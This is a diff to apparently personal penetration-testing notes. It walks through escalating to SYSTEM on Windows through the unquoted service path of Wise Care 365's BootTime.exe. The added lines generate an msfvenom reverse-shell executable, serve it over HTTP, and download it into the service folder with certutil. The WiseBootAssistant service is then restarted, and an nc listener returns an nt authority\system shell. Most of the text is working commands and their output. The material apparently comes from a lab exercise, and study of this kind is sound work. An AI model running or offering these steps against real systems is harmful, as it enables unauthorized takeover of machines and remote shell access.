@@ -341,7 +341,9 @@ The `C:\Program FIles (x86)\Wise\Wise Case 365\BootTime.exe` is unquoted, it mea
 #msfvenom
 #injectmalware
 #unquotedinjectmalware
-Inject malware from the kali `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.64.4 LPORT=7777 -f exe > Wise.exe`
+1. Inject malware from the kali 
+	- From kali execute `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.64.4 LPORT=7777 -f exe > Wise.exe`
+	- Make your kali as python http server to transfer it to the `C:\Program FIles (x86)\Wise
 
 ```
 ┌──(root㉿kali)-[~/Downloads]
@@ -361,5 +363,95 @@ Final size of exe file: 7168 bytes
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 192.168.64.7 - - [08/Jul/2024 17:35:48] "GET /Wise.exe HTTP/1.1" 200 -
 192.168.64.7 - - [08/Jul/2024 17:35:49] "GET /Wise.exe HTTP/1.1" 200 -
+
+```
+
+- Now go to `C:\Program Files (x86)\Wise`then download the malware you got from kali  `certutil -utlcache -f http://192.168.64.4/Wise.exe Wise.exe`
+- Stop and start the service while doing the reverseshell nc -nvlp 7777
+
+```
+C:\>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 1067-CB24
+
+ Directory of C:\
+
+12/07/2019  02:14 AM    <DIR>          PerfLogs
+07/08/2024  01:41 PM    <DIR>          Program Files
+02/04/2023  07:51 PM    <DIR>          Program Files (x86)
+08/14/2021  05:29 AM    <DIR>          Users
+02/04/2023  08:18 PM    <DIR>          Windows
+               0 File(s)              0 bytes
+               5 Dir(s)  12,388,593,664 bytes free
+
+C:\>cd Program Files (x86)
+cd Program Files (x86)
+
+C:\Program Files (x86)>cd Wise  
+cd Wise
+
+C:\Program Files (x86)\Wise>certutil -utlcache -f http://192.168.64.4/Wise.exe Wise.exe
+certutil -utlcache -f http://192.168.64.4/Wise.exe Wise.exe
+CertUtil: Unknown arg: -utlcache
+
+
+CertUtil -?              -- Display a verb list (command list)
+CertUtil -dump -?        -- Display help text for the "dump" verb
+CertUtil -v -?           -- Display all help text for all verbs
+
+
+C:\Program Files (x86)\Wise>certutil -urlcache -f http://192.168.64.4/Wise.exe Wise.exe
+certutil -urlcache -f http://192.168.64.4/Wise.exe Wise.exe
+****  Online  ****
+CertUtil: -URLCache command completed successfully.
+
+C:\Program Files (x86)\Wise>sc stop WiseBootAssistant
+sc stop WiseBootAssistant
+
+SERVICE_NAME: WiseBootAssistant 
+        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
+        STATE              : 3  STOP_PENDING 
+                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x3
+        WAIT_HINT          : 0x1388
+
+C:\Program Files (x86)\Wise>sc query WiseBootAssistant
+sc query WiseBootAssistant
+
+SERVICE_NAME: WiseBootAssistant 
+        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
+        STATE              : 1  STOPPED 
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+
+C:\Program Files (x86)\Wise>sc start WiseBootAssistant
+sc start WiseBootAssistant
+[SC] StartService FAILED 1053:
+
+The service did not respond to the start or control request in a timely fashion.
+
+
+C:\Program Files (x86)\Wise>
+
+```
+
+- While you start the service `sc start WiseBootAssistant` listen to your kali via `nc -nvlp 7777`
+- Now you got the nt authority system
+```
+┌──(root㉿kali)-[/transfer]
+└─# nc -nvlp 7777
+listening on [any] 7777 ...
+connect to [192.168.64.4] from (UNKNOWN) [192.168.64.7] 49705
+Microsoft Windows [Version 10.0.19043.928]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
 
 ```
